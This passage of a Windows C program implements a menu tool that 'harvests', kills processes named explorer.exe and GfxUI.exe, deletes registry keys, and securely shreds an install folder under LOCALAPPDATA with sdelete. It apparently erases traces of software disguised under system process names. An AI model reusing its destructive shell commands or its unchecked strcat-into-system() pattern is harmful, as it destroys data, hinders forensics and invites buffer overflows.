
            _flushall();
            system("cls");

            printf("[ 2. Harvest ]\n"
                "========================================\n\n");

            fnHarvest();

            printf("\nDone! Hit a key to display main menu!\n");

            printf("=========================================\n\n");

            /*
             * Must explicitly flush, by using fflush or _flushall,
             * or close any stream before you call system.
             */

            _flushall();
            system("pause");
            
            break;
        case '3':
            /*
             * Must explicitly flush, by using fflush or _flushall,
             * or close any stream before you call system.
             */

            _flushall();
            system("cls");

            printf("[ 3. Harvest - Uninstall - Shred ]\n"
                "========================================\n\n");

            fnUninstallAndShred();

            printf("\nDone! Hit a key to display main menu!\n");

            printf("=========================================\n\n");

            /*
             * Must explicitly flush, by using fflush or _flushall,
             * or close any stream before you call system.
             */

            _flushall();
            system("pause");

            break;
        case '4':
            /*
             * Must explicitly flush, by using fflush or _flushall,
             * or close any stream before you call system.
             */

            _flushall();
            system("cls");

            printf("[ 4. Exit ]\n"
                "========================================\n\n");

            printf("Terminated! Bye for now...\n\n");

            printf("=========================================\n\n");

            /*
             * Must explicitly flush, by using fflush or _flushall,
             * or close any stream before you call system.
             */

            _flushall();
            system("pause");

            break;
        default:
            /*
             * Must explicitly flush, by using fflush or _flushall,
             * or close any stream before you call system.
             */

            _flushall();
            system("cls");

            printf("[ ATTENTION ]\n"
                "========================================\n\n");

            printf("Out of options!\n\n");

            printf("=========================================\n\n");

            /*
             * Must explicitly flush, by using fflush or _flushall,
             * or close any stream before you call system.
             */

            _flushall();
            system("pause");

            break;
        }
    } while(cChoice != '4');

    return 0;
}

/*****************************************************************************/
/*****************************************************************************/
/*
 * To ensure correct resolution of symbols, add Psapi.lib to TARGETLIBS
 * and compile with -DPSAPI_VERSION=1
 */

void fnPrintProcessNameAndID(DWORD processID)
{
    TCHAR tchszProcessName[MAX_PATH] = TEXT("<unknown>");

    /*************************************************************************/
    /* Get a handle to the process. */
    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION |
        PROCESS_VM_READ,
        FALSE, processID);

    /*************************************************************************/
    /* Get the process name. */
    if(NULL != hProcess)
    {
        HMODULE hMod;
        DWORD cbNeeded;

        if(EnumProcessModules(hProcess, &hMod, sizeof(hMod), &cbNeeded))
        {
            GetModuleBaseName(hProcess, hMod, tchszProcessName,
                sizeof(tchszProcessName) / sizeof(TCHAR));
        }
    }


    /*************************************************************************/
    /* processname and pid number printer. */
    //// Print the process name and identifier.
    //_tprintf(TEXT("%s\t\t\t[PID: %u]\n"), tchszProcessName, processID);


    /*************************************************************************/
    /* Type conversion for name comparison for taskkill. */

    /* At first, tchar to char array conversion. */
    char szProcessName[MAX_PATH] = {""};

    /* tchar array to char array conversion. */
    wcstombs(szProcessName, tchszProcessName, wcslen(tchszProcessName) + 1);


    /*************************************************************************/
    /* .exe comparison. */

    /*
     * Attention!
     * Adds new char array for each exe and adds comparison check to if header.
     */

    char szExplrrPrcssNameForCmprsn[21] = "explorer.exe";
    char szGfxuiPrcssNameForCmprsn[21] = "GfxUI.exe";

    /*
     * Compares two string buffers.
     * 0 - identical strings except for case.
     * x - any integer, means not identical.
     */

    if(
        ((_memicmp(szProcessName, szExplrrPrcssNameForCmprsn, 21)) == 0) ||
        ((_memicmp(szProcessName, szGfxuiPrcssNameForCmprsn, 21)) == 0)
        )
    {
        /* Terminates the specified process and all of its threads. */

        /*********************************************************************/
        /*********************************************************************/
        /* Version 1 */

        //TerminateProcess(hProcess, 1);

        /*********************************************************************/
        /* Version 2 */

        char cUINTtoCharArray[32];
        unsigned int uiInteger = processID;

        sprintf(cUINTtoCharArray, "%d", uiInteger);

        char szTaskkillCommandArray[MAX_PATH] = "taskkill /pid ";
        strcat(szTaskkillCommandArray, cUINTtoCharArray);
        /* szTaskkillCommandArray contains pid number now. */

        /* Lets terminate specified exes. */

        /*
         * Must explicitly flush, by using fflush or _flushall,
         * or close any stream before you call system.
         */

        _flushall();
        system(szTaskkillCommandArray);
    }

    /*************************************************************************/
    /* Release the handle to the process. */
    CloseHandle(hProcess);
}

/*****************************************************************************/
/*****************************************************************************/

int fnUninstallAndShred(void)
{
    /* Registry deletion first. */
    fnExplorerRegistryDelete();
    fnGfxuiRegistryDelete();

    /* Enumerates processes and terminates if searching exe founds. */
    fnEnumProcesses();

    /* Removes install directory. */
    /*************************************************************************/
    /* Gets localappdata path. */
    char* cpLocalAppdataPath = getenv("LOCALAPPDATA");

    /*************************************************************************/
    /* Assigns and stores rec path on system. */
    char szSystemMainPath[MAX_PATH] = {""};

    strcat(szSystemMainPath, cpLocalAppdataPath);

    strcat(szSystemMainPath, "\\");
    strcat(szSystemMainPath, MAIN_DIR);


    /*************************************************************************/
    /* Is main directory. exists on system? */

    /* At first, type conversion to char array to wchar_t array pointer. */
    wchar_t* wctpSystemMainPath = fnCharToWCharConverter(szSystemMainPath);

    /* Checks file existens and assign. */
    bool bIsDirectoryExists = fnIsDirectoryExists(wctpSystemMainPath);

    /*
     * if != FALSE, lets make remove it.
     * else(directory does not exists), print message.
     */

    if(bIsDirectoryExists != FALSE)
    {
        ///*************************************************************************/
        ///* Version 1 */
        //char szRemoveDirCommandArray[MAX_PATH] = {"rd /s /q "};
        //strcat(szRemoveDirCommandArray, szSystemMainPath);

        //SetFileAttributesA(szSystemMainPath, (GetFileAttributesA(szSystemMainPath) & ~FILE_ATTRIBUTE_READONLY));


        ///*
        // * Must explicitly flush, by using fflush or _flushall,
        // * or close any stream before you call system.
        // */

        //_flushall();
        //// system("rm -rf /path/to/directory");
        //system(szRemoveDirCommandArray);

        ///*************************************************************************/
        ///* Version 2 */

        fnHarvest();

        char szShredDirCommandArray[MAX_PATH] = {".\\src\\sdelete.exe -p 5 -r -s -q \""};
        strcat(szShredDirCommandArray, szSystemMainPath);
        strcat(szShredDirCommandArray, "\"");

        /*
         * Must explicitly flush, by using fflush or _flushall,
         * or close any stream before you call system.
         */

        _flushall();
        /* system("rm -rf /path/to/directory"); */
        system(szShredDirCommandArray);
    }
    else
    {
        fnDirectoryNotExistMessages();
    }

    return 0;
}

/*****************************************************************************/
/*****************************************************************************/

int main()
{
    fnOptionMenu();

    return 0;
}

// Run program: Ctrl + F5 or Debug > Start Without Debugging menu
// Debug program: F5 or Debug > Start Debugging menu

// Tips for Getting Started: 
//   1. Use the Solution Explorer window to add/manage files
//   2. Use the Team Explorer window to connect to source control
//   3. Use the Output window to see build output and other messages
//   4. Use the Error List window to view errors
//   5. Go to Project > Add New Item to create new code files, or Project > Add Existing Item to add existing code files to the project
//   6. In the future, to open this project again, go to File > Open > Project and select the .sln file
